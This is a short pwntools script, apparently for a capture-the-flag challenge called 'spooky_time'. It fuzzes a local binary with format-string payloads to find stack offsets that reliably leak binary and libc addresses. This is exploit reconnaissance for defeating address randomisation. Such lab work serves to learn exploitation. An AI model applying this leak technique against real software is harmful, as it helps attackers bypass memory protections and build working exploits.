#!/usr/bin/env python3

# python fuzz.py > 1.txt; python fuzz.py > 2.txt; python fuzz.py > 3.txt;
# python compare_files.py 1.txt 2.txt 3.txt

from pwn import *

context.log_level = 'warning'

e = ELF("./spooky_time_patched")
uint64_max = (1 << 64) - 1

def main():
    for i in range(1, 70):
        binary_diff = -1
        libc_diff = -1
        for j in range(20):
            r = process([e.path], stdin=process.PTY, stdout=process.PTY)
            r.sendlineafter(b'say something scary!', f'%{i}$p'.encode())
            r.recvuntil(b'Seriously?? I bet you can do better than ')
            r.recvline()
            data = r.recvline().strip()
            if data == b'0x0' or data == '(nil)':
                r.close()
                break
            try:
                addr = int(data, 16)
            except Exception as _:
                r.close()
                break
            binary_addr = r.libs()[e.path]
            tmp_binary_diff = addr - binary_addr
            tmp_libc_diff = addr - r.libc.address
            # warning(f'binary address {hex(binary_addr)}')
            # warning(f'libc address {hex(r.libc.address)}')

            if binary_diff == -1:
                binary_diff = tmp_binary_diff
            elif binary_diff == uint64_max:
                pass
            elif binary_diff != tmp_binary_diff:
                binary_diff = uint64_max

            if libc_diff == -1:
                libc_diff = tmp_libc_diff
            elif libc_diff == uint64_max:
                pass
            elif libc_diff != tmp_libc_diff:
                libc_diff = uint64_max
            r.close()

        if binary_diff != -1 and binary_diff != uint64_max:
            warning(f'{i}: stable binary_diff {hex(binary_diff)}')
        if libc_diff != -1 and libc_diff != uint64_max:
            warning(f'{i}: stable libc_diff {hex(libc_diff)}')


if __name__ == "__main__":
    main()
